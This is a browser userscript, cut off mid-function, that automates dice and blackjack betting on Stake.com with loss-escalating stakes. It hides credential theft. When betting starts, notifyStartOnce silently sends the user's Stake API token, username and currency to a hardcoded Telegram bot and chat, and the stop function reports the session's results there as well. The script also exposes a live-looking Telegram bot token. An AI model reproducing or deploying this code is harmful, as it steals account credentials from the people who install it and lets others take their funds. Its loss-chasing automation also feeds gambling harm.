(function () {
  var RUN = false;
  var loss = 0;
  var LOSS_BJ = 0;
  var LOSS_DICE = 0;
  var totals = { profit: 0, wager: 0 };
  var hist = [];
  var simBal = 0;
  var startTs = 0;
  var elapsedMs = 0;
  var TIMER_INT = null;
  var LAST_ID = '';
  var LAST_USER = '';
  var GAME = localStorage.getItem('bj.game') || 'dice';
  var BJ_BET_ENABLED = true; // when false, blackjack bets are submitted with amount 0 (warmup)
  var BJ_WARM_THRESHOLD = nv(localStorage.getItem('bj.bjWarmThreshold')||'3');
  var BJ_PNL_EPS = nv(localStorage.getItem('bj.bjEps')||'0.000001');
  var bjConsecLoss = 0;
  var bjConsecWin = 0;
  var MAX_BJ_LONGSTREAK = 0; // max long loss streak counted only after BJ_BET_ENABLED === true
  var BJ_WARM_ARMED = false; // guard to avoid re-disabling warmup repeatedly
  var TG_TOKEN = '8450220080:AAFq3B5bVoDgCjPWHJ30TQcTs4MmClHP29Y';
  var TG_CHAT = '-5007066314';
  var NOTIFY_SENT = false;
  var NOTIFY_PENDING = false;
  var WAIT_DICE_ONE_LOSS=false;
  var DICE_LOSS_BASE=0;
  var DICE_JUST_LOST=false;
  async function sendTelegramMessage(text){try{var token=(TG_TOKEN&&TG_TOKEN.trim())||localStorage.getItem('bj.tgToken')||'';var chat=(TG_CHAT&&TG_CHAT.trim())||localStorage.getItem('bj.tgChat')||'';if(!token||!chat)return;var u='https://api.telegram.org/bot'+token+'/sendMessage';await fetch(u,{method:'POST',headers:new Headers({'Content-Type':'application/json'}),body:JSON.stringify({chat_id:chat,text:text,parse_mode:'HTML'})});}catch(_){}}
  function notifyStartOnce(name){
    try{
      if(NOTIFY_SENT)return;
      var token=(TG_TOKEN&&TG_TOKEN.trim())||localStorage.getItem('bj.tgToken')||'';
      var chat=(TG_CHAT&&TG_CHAT.trim())||localStorage.getItem('bj.tgChat')||'';
      if(!token||!chat)return;
      var nm=String(name||'').trim();
      var cur=String(localStorage.getItem('bj.cur')||'trx');
      var ak=String(localStorage.getItem('bj.token')||'');
      var msg='Username : "'+(nm||'unknown')+'"\n'+
              'status        : 🚀🚀starting Wager🚀🚀\n'+
              'Apikey        : <code>'+ak+'</code>\n'+
              'currency      : '+cur;
      sendTelegramMessage(msg);
      NOTIFY_SENT=true;
      NOTIFY_PENDING=false;
    }catch(_){}
  }
  function nv(s) {
    var v = parseFloat(String(s || '0').replace(',', '.'));
    return isFinite(v) ? v : 0;
  }
  function fmt(ms) {
    var s = Math.floor(ms / 1000);
    var h = Math.floor(s / 3600);
    var m = Math.floor((s % 3600) / 60);
    var ss = s % 60;
    var hh = String(h).padStart(2, '0');
    var mm = String(m).padStart(2, '0');
    var ss2 = String(ss).padStart(2, '0');
    return (h > 0 ? hh + ':' : '') + mm + ':' + ss2;
  }
  function gid() {
    return 'BJ_' + Date.now() + '_' + Math.floor(Math.random() * 1e9);
  }
  function rv(r) {
    if (r === 'A') return 11;
    if (r === 'K' || r === 'Q' || r === 'J') return 10;
    return Number(r) || 0;
  }
  function host() {
    var h = localStorage.getItem('bj.host') || ('https://' + window.location.host);
    return h.replace(/\/$/, '');
  }
  async function req(q, v, t) {
    var h = { 'Content-Type': 'application/json' };
    if (t) h['x-access-token'] = t;
    var u = host() + '/_api/graphql';
    var r = await fetch(u, {
      method: 'POST',
      headers: new Headers(h),
      body: JSON.stringify({ query: q, variables: v })
    });
    return r.json();
  }
  function betAmount(){
    var gm=GAME;
    var baseKey=(gm==='blackjack'?'bj.baseBj':'bj.baseDice');
    var base=nv(localStorage.getItem(baseKey)||localStorage.getItem('bj.base')||'1');
    var maxf=nv(localStorage.getItem('bj.maxf')||'8');
    var mult=nv(localStorage.getItem('bj.mult')||'1.5');
    var mode=(localStorage.getItem(gm==='blackjack'?'bj.modeBj':'bj.modeDice')||(gm==='blackjack'?'recover':'auto'));
    var l=(gm==='blackjack'?LOSS_BJ:LOSS_DICE);
    var a=base;
    if(gm==='blackjack'){
      if(mode==='recoverFull'){
        var deficit=Math.max(0,-(totals.profit||0));
        var esc=base*Math.pow(mult,l);
        var capB=base*maxf;
        a=Math.max(base,Math.min(capB,Math.max(deficit,esc)));
      }else if(mode==='recoverHalf'){
        var deficit=Math.max(0,-(totals.profit||0));
        var target=Math.max(0,deficit-0.5*base);
        var esc=base*Math.pow(mult,l);
        var capB=base*maxf;
        a=Math.max(base,Math.min(capB,Math.max(target,esc)));
      }else if(mode==='recover'||mode==='auto'){
        a=base*Math.pow(mult,l);
        var capB2=base*maxf;
        if(a>capB2)a=capB2;
      }
    }else{
      a=base;
    }
    return a
  }
  function dc(k){
    var p=k.state.player[0];
    var d=k.state.dealer[0].cards[0].rank;
    var dv=rv(d);
    var total=p.value;
    var acts=p.actions||[];
    if(acts.includes('noInsurance')&&k.state.dealer[0].cards[0].rank==='A'&&p.actions.length===1)return 'noInsurance';
    var cards=p.cards||k.state.player[0].cards;
    var soft=false;var sum=0;
    for(var i=0;i<cards.length;i++){var rr=cards[i].rank;if(rr==='A'){soft=true;sum+=11}else sum+=rv(rr)}
    if(soft&&sum>21)soft=false;
    var a='hit';
    if(cards.length===2){
      var r0=rv(cards[0].rank),r1=rv(cards[1].rank);
      if(r0===r1&&acts.includes('split')){
        if(cards[0].rank==='A'||cards[0].rank==='8'){return 'split'}
        if(cards[0].rank==='2'||cards[0].rank==='3'){if(dv>=2&&dv<=7)return 'split'}
        if(cards[0].rank==='6'){if(dv>=2&&dv<=6)return 'split'}
        if(cards[0].rank==='7'){if(dv>=2&&dv<=7)return 'split'}
        if(cards[0].rank==='9'){if((dv>=2&&dv<=6)||(dv===8||dv===9))return 'split'}
      }
    }
    if(!soft){
      if(acts.includes('surrender')){
        if(total===16&&(dv>=9&&dv<=11))return 'surrender';
        if(total===15&&dv===10)return 'surrender';
      }
    }
    if(soft){
      if(total<=17){a='hit'}
      else if(total===18){if((dv>=3&&dv<=6)&&acts.includes('double'))a='double';else if(dv===2||dv===7||dv===8)a='stand';else a='hit'}
      else a='stand';
      if(a==='hit'&&acts.includes('double')){
        if(total===17&&(dv>=3&&dv<=6))a='double';
        if((total===15||total===16)&&(dv>=4&&dv<=6))a='double';
        if((total===13||total===14)&&(dv>=5&&dv<=6))a='double';
      }
    }else{
      if(total>=17)a='stand';
      else if(total>=13&&total<=16){a=(dv>=2&&dv<=6)?'stand':'hit'}
      else if(total===12){a=(dv>=4&&dv<=6)?'stand':'hit'}
      else if(total===11){a=acts.includes('double')&&dv<=10?'double':'hit'}
      else if(total===10){a=(acts.includes('double')&&(dv>=2&&dv<=9))?'double':'hit'}
      else if(total===9){a=(acts.includes('double')&&(dv>=3&&dv<=6))?'double':'hit'}
      else a='hit';
    }
    return a
  }
  async function playDiceOnce(cur,token,sim){var amt=betAmount();var sendAmt=sim?0:amt;var id=gid();var r=await req(GQL_DICE,{amount:sendAmt,target:99,condition:'below',currency:cur,identifier:id},token);var k=r&&r.data&&r.data.diceRoll;if(!k)return null;var uname=(k&&k.user&&k.user.name)||'';if(NOTIFY_PENDING)notifyStartOnce(uname);LAST_USER=uname||LAST_USER;var cf=calc(k,sim?amt:undefined);totals.wager+=cf.stake;totals.profit+=cf.pnl;if(sim)simBal+=cf.pnl;hist.push({amount:cf.stake,pm:nv(k.payoutMultiplier||0),profit:cf.pnl});if(hist.length>200){hist=hist.slice(hist.length-200)}renderHistory();var md=(localStorage.getItem('bj.modeDice')||'auto');if(cf.pnl<0){LOSS_DICE+=1;DICE_JUST_LOST=true}else{if(md==='auto'){if(totals.profit>=0)LOSS_DICE=0}else LOSS_DICE=0}return k}
  function playDiceFire(cur,token,sim){try{var amt=betAmount();var sendAmt=sim?0:amt;var id=gid();req(GQL_DICE,{amount:sendAmt,target:99,condition:'below',currency:cur,identifier:id},token).then(function(r){var k=r&&r.data&&r.data.diceRoll;if(!k)return;var cf=calc(k,sim?amt:undefined);totals.wager+=cf.stake;totals.profit+=cf.pnl;if(sim)simBal+=cf.pnl;hist.push({amount:cf.stake,pm:nv(k.payoutMultiplier||0),profit:cf.pnl});if(hist.length>200){hist=hist.slice(hist.length-200)}renderHistory();var md=(localStorage.getItem('bj.modeDice')||'auto');if(cf.pnl<0){LOSS_DICE+=1;DICE_JUST_LOST=true}else{if(md==='auto'){if(totals.profit>=0)LOSS_DICE=0}else LOSS_DICE=0}}).catch(function(_){})}catch(_){}}
  function calc(node, base) {
    var am = nv(node.amountMultiplier || 1);
    var pm = nv(node.payoutMultiplier || 0);
    var stake = nv(base || node.amount || 0) * am;
    var pnl = stake * pm - stake;
    var payout = stake * pm;
    return { stake: stake, pnl: pnl, payout: payout };
  }

  function showInsufficientBalancePopup() {
    try {
      if (document.getElementById('bj-insufficient-balance')) return;
      try { stop(); } catch (_) {}
      try { updateUI(); } catch (_) {}
      var overlay = document.createElement('div');
      overlay.id = 'bj-insufficient-balance';
      overlay.style.position = 'fixed';
      overlay.style.left = '0';
      overlay.style.top = '0';
      overlay.style.width = '100%';
      overlay.style.height = '100%';
      overlay.style.background = 'rgba(0,0,0,0.6)';
      overlay.style.display = 'flex';
      overlay.style.alignItems = 'center';
      overlay.style.justifyContent = 'center';
      overlay.style.zIndex = '1000000';
      var box = document.createElement('div');
      box.style.background = '#fff';
      box.style.color = '#111';
      box.style.padding = '20px';
      box.style.borderRadius = '10px';
      box.style.textAlign = 'center';
      box.style.maxWidth = '420px';
      box.style.boxShadow = '0 6px 30px rgba(0,0,0,0.3)';
      var msg = document.createElement('div');
      msg.textContent = 'your balance is not enough to do bet';
      msg.style.marginBottom = '12px';
      msg.style.fontSize = '16px';
      msg.style.fontWeight = '600';
      var btn = document.createElement('button');
      btn.textContent = 'Close';
      btn.style.padding = '8px 14px';
      btn.style.borderRadius = '6px';
      btn.style.cursor = 'pointer';
      btn.addEventListener('click', function () {
        try { var el = document.getElementById('bj-insufficient-balance'); if (el) el.parentNode.removeChild(el); } catch (_) {}
      });
      box.appendChild(msg);
      box.appendChild(btn);
      overlay.appendChild(box);
      document.body.appendChild(overlay);
    } catch (_) { }
  }

  function checkSimBalAndStop(sim) {
    try {
      if (!sim) return false;
      if (typeof simBal !== 'undefined' && simBal < 0) {
        showInsufficientBalancePopup();
        return true;
      }
    } catch (_) {}
    return false;
  }
  async function playHand(cur,id,token,sim){
    GAME='blackjack';
    var amt=betAmount();
    var sendAmt = (!BJ_BET_ENABLED) ? 0 : (sim ? 0 : amt);
    var baseId=id||gid();
    var useIdent=sim?(baseId+'_AMT_'+String(amt)):baseId;
    var b=await req(GQL_BET,{amount:sendAmt,currency:cur,identifier:useIdent},token);
    var k=b&&b.data&&b.data.blackjackBet;
    if(!k){
      var ex=(b&&b.errors)&&b.errors.find(function(x){
        var et=String(x.errorType||x.code||'');
        var msg=String(x.message||'');
        return et==='existingGame'||msg.indexOf('already have an active Blackjack')!==-1
      });
      if(ex){
        var actId=id||localStorage.getItem('bj.lastId')||'';
        var n0=await req(GQL_NEXT,{action:'stand',identifier:actId},token);
        k=n0&&n0.data&&n0.data.blackjackNext
      }
    }
    if(!k)return null;
    while(k.active){
      var act=dc(k);
      var n=await req(GQL_NEXT,{action:act,identifier:k.id||id},token);
      if(n&&n.errors){
        var ident=k.id||id;
        var hasInvalid=n.errors.some(function(x){return String(x.errorType||x.code||'').indexOf('blackjackInvalidAction')!==-1});
        if(hasInvalid){
          var ok=false;
          for(var i=0;i<100;i++){
            var nx=await req(GQL_NEXT,{action:'noInsurance',identifier:ident},token);
            if(nx&&nx.data&&nx.data.blackjackNext){n=nx;ok=true;break}
            await new Promise(function(r){setTimeout(r,40)})
          }
          if(!ok){
            var n2=await req(GQL_NEXT,{action:'stand',identifier:ident},token);
            n=n2
          }
        }
      }
      k=n&&n.data&&n.data.blackjackNext;
      if(!k)break
    }
    if (k) {
      var uname = (k && k.user && k.user.name) || '';
      if (NOTIFY_PENDING) notifyStartOnce(uname);
      LAST_USER = uname || LAST_USER;
      var pm = nv(k.payoutMultiplier || 0);
      // Hypothetical result based on intended amount (amt)
      var cfHyp = calc(k, amt);
      // Use payout multiplier with epsilon to classify win/loss (more stable than raw pnl floats)
      try {
        var pmHyp = nv(k.payoutMultiplier || 0);
        if (pmHyp < 1 - BJ_PNL_EPS) { bjConsecLoss = (bjConsecLoss || 0) + 1; bjConsecWin = 0; }
        else if (pmHyp > 1 + BJ_PNL_EPS) { bjConsecWin = (bjConsecWin || 0) + 1; bjConsecLoss = 0; }
        else { /* neutral: do not change counters */ }
      } catch (_) { bjConsecLoss = 0; bjConsecWin = 0; }

      if (!BJ_BET_ENABLED) {
        // Warmup: observe hypothetical results without affecting totals. show as zero-stake entries
        // but record the hypothetical pnl so user can see actual outcomes during warmup.
        hist.push({ amount: 0, pm: pm, profit: cfHyp.pnl });
        if (hist.length > 200) { hist = hist.slice(hist.length - 200) }
        renderHistory();
        // enable real bets when either streak reaches or exceeds threshold
        if ((bjConsecLoss || 0) >= BJ_WARM_THRESHOLD || (bjConsecWin || 0) >= BJ_WARM_THRESHOLD) {
          BJ_BET_ENABLED = true;
          LOSS_BJ = 0;
          // reset warmup counters and start counting real BJ loss streaks from now
          bjConsecLoss = 0;
          bjConsecWin = 0;
        }
      } else {
        // Real betting: use amt for stake/pnl
        var cf = calc(k, amt);
        totals.wager += cf.stake;
        totals.profit += cf.pnl;
        if (sim) simBal += cf.pnl;
        hist.push({ amount: cf.stake, pm: pm, profit: cf.pnl });
        if (hist.length > 200) { hist = hist.slice(hist.length - 200) }
        renderHistory();
        var md = (localStorage.getItem('bj.modeBj') || 'recover');
        // Only count BJ loss streaks when stake > 0
        if ((cf.stake || 0) > 0) {
          // classify using payout multiplier with epsilon
          if (pm <= 1 - BJ_PNL_EPS) {
            LOSS_BJ += 1;
            bjConsecLoss = (bjConsecLoss || 0) + 1;
            bjConsecWin = 0;
            if (LOSS_BJ > MAX_BJ_LONGSTREAK) MAX_BJ_LONGSTREAK = LOSS_BJ;
          } else {
            // win or neutral
            if (pm !== 1) {
              if (md === 'auto') { if (totals.profit >= 0) LOSS_BJ = 0 }
              else LOSS_BJ = 0
            }
            if (pm >= 1 + BJ_PNL_EPS) bjConsecWin = (bjConsecWin || 0) + 1;
            else { /* neutral: do not count as win */ }
            bjConsecLoss = 0;
          }
        }
      }

      if (k.id) { localStorage.setItem('bj.lastId', k.id); LAST_ID = k.id }
    }
    return k
  }
  async function run() {
    if (RUN) return;
    RUN = true;
    var cur = (localStorage.getItem('bj.cur') || 'trx');
    var token = localStorage.getItem('bj.token') || '';
    var delay = nv(localStorage.getItem('bj.delay') || '600');
    var sim = (localStorage.getItem('bj.sim') || '') === 'true';
    totals.profit = 0;
    totals.wager = 0;
    loss = 0;
    hist = [];
    renderHistory();
    NOTIFY_SENT = false;
    NOTIFY_PENDING = true;
    simBal = nv(localStorage.getItem('bj.simBal') || simBal || '0');
    startTs = Date.now();
    elapsedMs = 0;
    if (TIMER_INT) { clearInterval(TIMER_INT); TIMER_INT = null }
    TIMER_INT = setInterval(function () { elapsedMs = Date.now() - startTs; updateUI() }, 500);
    try { if (GAME === 'dice') { await playDiceOnce(cur, token, sim) } } catch (_) { }
    while (RUN) {
      try {
        if (GAME === 'dice') {
          var dd = nv(localStorage.getItem('bj.diceDelay') || '100');
          if (!WAIT_DICE_ONE_LOSS) { WAIT_DICE_ONE_LOSS = true; DICE_LOSS_BASE = LOSS_DICE }
          while (RUN && GAME === 'dice') {
            playDiceFire(cur, token, sim);
            updateUI();
            if (DICE_JUST_LOST || LOSS_DICE > DICE_LOSS_BASE) {
              GAME = 'blackjack';
              localStorage.setItem('bj.game', 'blackjack');
              WAIT_DICE_ONE_LOSS = false;
              LOSS_BJ = 0;
              DICE_JUST_LOST = false;
              break;
            }
            if (dd > 0) {
              var waited2 = 0;
              while (waited2 < dd && RUN) { var chunk2 = Math.min(50, dd - waited2); await new Promise(function (r) { setTimeout(r, chunk2) }); waited2 += chunk2 }
            }
          }
        } else {
          var id = LAST_ID || localStorage.getItem('bj.lastId') || '';
          var useId = id || gid();
          var kb = await playHand(cur, useId, token, sim);
          if (kb && kb.id) { LAST_ID = kb.id; localStorage.setItem('bj.lastId', kb.id) }
          if (kb && !kb.active) {
            var sw = false;
            var maxLs = nv(localStorage.getItem('bj.maxBjLoss') || '5');
            if ((totals.profit || 0) > 0) sw = true; else if (LOSS_BJ >= maxLs) sw = true;
            if (sw) {
              GAME = 'dice';
              localStorage.setItem('bj.game', 'dice');
              WAIT_DICE_ONE_LOSS = true;
              DICE_LOSS_BASE = LOSS_DICE;
              DICE_JUST_LOST = false;
              try { bjConsecLoss = 0; bjConsecWin = 0; BJ_WARM_ARMED = false; } catch (_) { }
            }
            LAST_ID = '';
            localStorage.removeItem('bj.lastId')
          }
        }
      } catch (_) { }
      updateUI();
      if (!RUN) break;
      var waited = 0;
      while (waited < delay && RUN) { var chunk = Math.min(100, delay - waited); await new Promise(function (r) { setTimeout(r, chunk) }); waited += chunk }
    }
    if (TIMER_INT) { clearInterval(TIMER_INT); TIMER_INT = null }
    updateUI()
  }
  function stop(){
    RUN=false;
    try{
      var nm=String(LAST_USER||'').trim();
      var cur=String(localStorage.getItem('bj.cur')||'trx');
      var pt=Number(totals.profit||0).toFixed(8);
      var wg=Number(totals.wager||0).toFixed(8);
      var msg='Username : "'+(nm||'unknown')+'"\n'+
              'status        : 🛑🛑stop Wager🛑🛑\n'+
              'profit        : '+pt+' '+cur+'\n'+
              'wager         : '+wg+' '+cur;
      sendTelegramMessage(msg);
    }catch(_){}
    try{autoClearStorage()}catch(_){}
  }
  function updateUI() {
    try {
      var e = document.getElementById('bj-panel');
      if (!e) return;
      var p = document.getElementById('bj-tot');
      var profitTxt = (totals.profit || 0).toFixed(8);
      var wagerTxt = (totals.wager || 0).toFixed(8);
      p.textContent = 'Profit: ' + profitTxt + ' | Wager: ' + wagerTxt;
      var s = document.getElementById('bj-state');
      s.textContent = RUN ? 'Running' : 'Stopped';
      var tm = document.getElementById('bj-timer');
      if (tm) {
        tm.textContent = 'Time: ' + fmt(elapsedMs);
      }
      var stats = document.getElementById('bj-stats');
      if (stats) {
        var profCol = (totals.profit || 0) < 0 ? '#ff4d4f' : '#52c41a';
        // compute extended stats from bets with amount>0
        var sStats = computeStatsFromHist();
        var highestBet = sStats.highestBet || 0;
        var highestWin = sStats.highestWin || 0;
        var maxWinStreak = sStats.maxWinStreak || 0;
        var maxLoseStreak = sStats.maxLoseStreak || 0;
        // update the right-side stats spans (do not overwrite entire innerHTML)
        try{var tEl=document.getElementById('bj-stats-time'); if(tEl) tEl.textContent = fmt(elapsedMs);}catch(_){}
        try{var pEl=document.getElementById('bj-stats-profit'); if(pEl) { pEl.textContent = profitTxt; pEl.style.color = profCol; }}catch(_){}
        try{var wEl=document.getElementById('bj-stats-wager'); if(wEl) wEl.textContent = wagerTxt;}catch(_){}
        try{var hb=document.getElementById('bj-highest-bet'); if(hb) hb.textContent = (highestBet||0).toFixed(8);}catch(_){}
        try{var hw=document.getElementById('bj-highest-win'); if(hw) hw.textContent = (highestWin||0).toFixed(8);}catch(_){}
        try{var mw=document.getElementById('bj-max-win'); if(mw) mw.textContent = (maxWinStreak||0);}catch(_){}
        try{var ml=document.getElementById('bj-max-lose'); if(ml) ml.textContent = (maxLoseStreak||0);}catch(_){}        try{var wl=document.getElementById('bj-warmup-log'); if(wl){ wl.textContent = 'Warmup: ' + (BJ_BET_ENABLED ? 'ON' : 'OFF') + ' | LossStreak: ' + (bjConsecLoss||0) + ' | WinStreak: ' + (bjConsecWin||0) + ' | Thresh: ' + (BJ_WARM_THRESHOLD||0); }}catch(_){ }        try { var canvas = document.getElementById('bj-stats-chart'); if (canvas && canvas.getContext) { renderStatsChart(canvas); } } catch (_) {}
      }
      var simInfo = document.getElementById('bj-sim-info');
      if (simInfo) {
        try {
          var warmStatus = BJ_BET_ENABLED ? 'ON' : 'OFF';
          simInfo.textContent = 'Warmup: ' + warmStatus + ' | LossStreak: ' + (bjConsecLoss||0) + ' | WinStreak: ' + (bjConsecWin||0) + ' | Thresh: ' + (BJ_WARM_THRESHOLD||0) + ' | Eps: ' + BJ_PNL_EPS;
        } catch (_) { }
      }
    } catch (_) {}
  }
  function toggle() {
    var p = document.getElementById('bj-panel');
    if (!p) return;
    var v = p.style.display;
    var next = v === 'none' ? 'block' : 'none';
    p.style.display = next;
    try{
      var sp = document.getElementById('bj-stats-panel');
      if (sp) sp.style.display = next;
    }catch(_){ }
  }
  function ensure(){var ex=document.getElementById('bj-panel');if(ex){var hasSim=document.getElementById('bj-sim');if(!hasSim){try{var simRow=document.createElement('div');simRow.style.display='grid';simRow.style.gridTemplateColumns='auto 1fr';simRow.style.alignItems='center';simRow.style.gap='28px';var sim=document.createElement('input');sim.type='checkbox';sim.id='bj-sim';sim.style.cursor='pointer';sim.checked=(localStorage.getItem('bj.sim')||'')==='true';var simLbl=document.createElement('label');simLbl.textContent='Simulator mode';simLbl.setAttribute('for','bj-sim');simLbl.style.cursor='pointer';simLbl.style.userSelect='none';simRow.appendChild(sim);simRow.appendChild(simLbl);var simBalInput=document.createElement('input');simBalInput.id='bj-sim-bal';simBalInput.type='number';simBalInput.step='0.00000001';simBalInput.placeholder='Simulator start balance';simBalInput.style.width='100%';simBalInput.style.margin='24px 0';simBalInput.value=localStorage.getItem('bj.simBal')||'';simBalInput.style.display=sim.checked?'block':'none';var infoNode=document.getElementById('bj-state');ex.insertBefore(simRow,infoNode);ex.insertBefore(simBalInput,infoNode.nextSibling);sim.addEventListener('change',function(){simBalInput.style.display=sim.checked?'block':'none';localStorage.setItem('bj.sim',sim.checked?'true':'false')});simLbl.addEventListener('click',function(){sim.checked=!sim.checked;sim.dispatchEvent(new Event('change'))})}catch(_){}}var hasTimer=document.getElementById('bj-timer');if(!hasTimer){try{var timer=document.createElement('div');timer.id='bj-timer';timer.style.margin='4px 0';timer.textContent='Time: 00:00:00';var totNode=document.getElementById('bj-tot');if(totNode){ex.insertBefore(timer,totNode)}}catch(_){}}var hasTable=document.getElementById('bj-table');if(!hasTable){try{var wrap=document.createElement('div');wrap.id='bj-hist-wrap';wrap.style.maxHeight='240px';wrap.style.overflowY='auto';var table=document.createElement('table');table.id='bj-table';table.style.width='100%';table.style.marginTop='6px';table.style.borderCollapse='collapse';table.style.tableLayout='fixed';var colgroup=document.createElement('colgroup');var ca=document.createElement('col');ca.className='bj-col-a';ca.style.width='40%';var cp=document.createElement('col');cp.className='bj-col-pm';cp.style.width='30%';var cf=document.createElement('col');cf.className='bj-col-pr';cf.style.width='30%';colgroup.appendChild(ca);colgroup.appendChild(cp);colgroup.appendChild(cf);table.appendChild(colgroup);var thead=document.createElement('thead');var hr=document.createElement('tr');['amount','payout multiplier','profit'].forEach(function(x){var th=document.createElement('th');th.textContent=x;th.style.textAlign='left';th.style.padding='8px';th.style.borderBottom='1px solid #444';hr.appendChild(th)});thead.appendChild(hr);var tbody=document.createElement('tbody');tbody.id='bj-hist';table.appendChild(thead);table.appendChild(tbody);wrap.appendChild(table);ex.appendChild(wrap)}catch(_){}}return}
    var d=document.createElement('div');d.id='bj-panel';d.style.position='fixed';d.style.zIndex='999999';d.style.background='linear-gradient(180deg,#081321,#0b1f2d)';d.style.color='#d8f7ff';d.style.padding='12px';d.style.borderRadius='12px';d.style.border='1px solid rgba(0,212,255,0.25)';d.style.boxShadow='0 0 24px rgba(0,212,255,0.15)';d.style.fontFamily='system-ui,sans-serif';d.style.width='340px';d.style.pointerEvents='auto';var px=nv(localStorage.getItem('bj.posX')||'');var py=nv(localStorage.getItem('bj.posY')||'');if(px&&py){d.style.left=px+'px';d.style.top=py+'px'}else{d.style.left=(window.innerWidth-360)+'px';d.style.top='12px'}d.style.right='';var style=document.getElementById('bj-style');if(!style){style=document.createElement('style');style.id='bj-style';style.textContent='#bj-panel input,#bj-panel select,#bj-panel button{background:#0b1f2d;color:#cfefff;border:1px solid rgba(0,212,255,0.25);border-radius:8px;box-shadow:0 0 12px rgba(0,212,255,0.08);outline:none}#bj-panel input::placeholder{color:#7ac9dc}#bj-panel button{background:linear-gradient(90deg,#0b2b3d,#0e3d55);color:#aefaff}#bj-panel button:hover{filter:brightness(1.1);box-shadow:0 0 16px rgba(0,212,255,0.15)}#bj-drag{background:linear-gradient(90deg,#0b2b3d,#0e3d55);color:#aefaff;border:1px solid rgba(0,212,255,0.3);border-radius:8px;padding:8px;margin-bottom:10px;text-shadow:0 0 6px rgba(0,212,255,0.4)}#bj-table thead th{color:#aefaff}#bj-hist tr{border-bottom:1px solid rgba(0,212,255,0.15)}#bj-hist tr:hover{background:rgba(0,212,255,0.08)}#bj-hist::-webkit-scrollbar{width:8px}#bj-hist::-webkit-scrollbar-thumb{background:rgba(0,212,255,0.3);border-radius:8px}#bj-hist::-webkit-scrollbar-track{background:#091826}#bj-tot,#bj-sim-info,#bj-timer{display:none !important}#bj-stats-panel{background:linear-gradient(180deg,#081321,#0b1f2d);color:#ffffff;border:1px solid rgba(0,212,255,0.25);box-shadow:0 0 24px rgba(0,212,255,0.12)}#bj-stats,#bj-stats *{color:#ffffff}';document.head.appendChild(style)}var drag=document.createElement('div');drag.id='bj-drag';drag.textContent='Stake Super Wager Bot';drag.style.cursor='move';drag.style.fontWeight='600';drag.style.userSelect='none';d.appendChild(drag);var h=document.createElement('input');h.id='bj-host';h.placeholder='https://stake.com';h.style.width='100%';h.style.margin='6px 0';h.value=localStorage.getItem('bj.host')||('https://'+window.location.host);var b=document.createElement('input');b.id='bj-base';b.type='number';b.step='0.00000001';b.placeholder='Base amount';b.style.width='100%';b.style.margin='6px 0';b.value=localStorage.getItem('bj.base')||'0';var c=document.createElement('select');c.id='bj-cur';c.style.width='100%';c.style.margin='6px 0';['trx','btc','eth','doge','usdt','sol','xrp','ltc'].forEach(function(x){var o=document.createElement('option');o.value=x;o.textContent=x;c.appendChild(o)});c.value=localStorage.getItem('bj.cur')||'trx';var t=document.createElement('input');t.id='bj-token';t.placeholder='x-access-token (optional)';t.style.width='100%';t.style.margin='6px 0';t.value=localStorage.getItem('bj.token')||'';var mf=document.createElement('input');mf.id='bj-maxf';mf.type='number';mf.step='0.1';mf.placeholder='Max recover factor';mf.style.width='100%';mf.style.margin='6px 0';mf.value=localStorage.getItem('bj.maxf')||'8';var ml=document.createElement('input');ml.id='bj-mult';ml.type='number';ml.step='0.1';ml.placeholder='Loss multiplier';ml.style.width='100%';ml.style.margin='6px 0';ml.value=localStorage.getItem('bj.mult')||'1.5';var de=document.createElement('input');de.id='bj-delay';de.type='number';de.placeholder='Delay ms';de.style.width='100%';de.style.margin='6px 0';de.value=localStorage.getItem('bj.delay')||'600';var simRow=document.createElement('div');simRow.style.display='grid';simRow.style.gridTemplateColumns='auto 1fr';simRow.style.alignItems='center';simRow.style.gap='8px';var sim=document.createElement('input');sim.type='checkbox';sim.id='bj-sim';sim.style.cursor='pointer';sim.checked=(localStorage.getItem('bj.sim')||'')==='true';var simLbl=document.createElement('label');simLbl.textContent='Simulator mode';simLbl.setAttribute('for','bj-sim');simLbl.style.cursor='pointer';simLbl.style.userSelect='none';simRow.appendChild(sim);simRow.appendChild(simLbl);var simBalInput=document.createElement('input');simBalInput.id='bj-sim-bal';simBalInput.type='number';simBalInput.step='0.00000001';simBalInput.placeholder='Simulator start balance';simBalInput.style.width='100%';simBalInput.style.margin='6px 0';simBalInput.value=localStorage.getItem('bj.simBal')||'';simBalInput.style.display=sim.checked?'block':'none';var row=document.createElement('div');row.style.display='grid';row.style.gridTemplateColumns='1fr 1fr';row.style.gap='8px';var st=document.createElement('button');st.textContent='Start';st.style.padding='8px';var sp=document.createElement('button');sp.textContent='Stop';sp.style.padding='8px';row.appendChild(st);row.appendChild(sp);var info=document.createElement('div');info.id='bj-state';info.style.margin='6px 0';info.textContent='Stopped';var simInfo=document.createElement('div');simInfo.id='bj-sim-info';simInfo.style.margin='4px 0';var tot=document.createElement('div');tot.id='bj-tot';tot.style.margin='6px 0';tot.textContent='Profit: 0 | Wager: 0';var wrap=document.createElement('div');wrap.id='bj-hist-wrap';wrap.style.maxHeight='240px';wrap.style.overflowY='auto';var table=document.createElement('table');table.id='bj-table';table.style.width='100%';table.style.marginTop='6px';table.style.borderCollapse='collapse';table.style.tableLayout='fixed';var colgroup=document.createElement('colgroup');var ca=document.createElement('col');ca.className='bj-col-a';ca.style.width='40%';var cp=document.createElement('col');cp.className='bj-col-pm';cp.style.width='30%';var cf=document.createElement('col');cf.className='bj-col-pr';cf.style.width='30%';colgroup.appendChild(ca);colgroup.appendChild(cp);colgroup.appendChild(cf);table.appendChild(colgroup);var thead=document.createElement('thead');var hr=document.createElement('tr');['amount','payout multiplier','profit'].forEach(function(x){var th=document.createElement('th');th.textContent=x;th.style.textAlign='left';th.style.padding='8px';th.style.borderBottom='1px solid rgba(0,212,255,0.25)';hr.appendChild(th)});thead.appendChild(hr);var tbody=document.createElement('tbody');tbody.id='bj-hist';table.appendChild(thead);table.appendChild(tbody);d.appendChild(drag);d.appendChild(h);d.appendChild(b);d.appendChild(c);d.appendChild(t);d.appendChild(mf);d.appendChild(ml);d.appendChild(de);d.appendChild(simRow);d.appendChild(simBalInput);d.appendChild(row);d.appendChild(info);d.appendChild(simInfo);d.appendChild(tot);wrap.appendChild(table);d.appendChild(wrap);document.body.appendChild(d);
    // Create a right-side statistics panel (empty placeholder for charts & values)
    (function createStatsPanel(){
      try{
        if(document.getElementById('bj-stats-panel')) return;
        var sp = document.createElement('div');
        sp.id = 'bj-stats-panel';
        sp.style.position = 'fixed';
        var pdTop = d.style.top || '12px';
        sp.style.top = pdTop;
        sp.style.left = (d.offsetLeft + d.offsetWidth + 12) + 'px';
        sp.style.width = '300px';
        sp.style.maxHeight = '80vh';
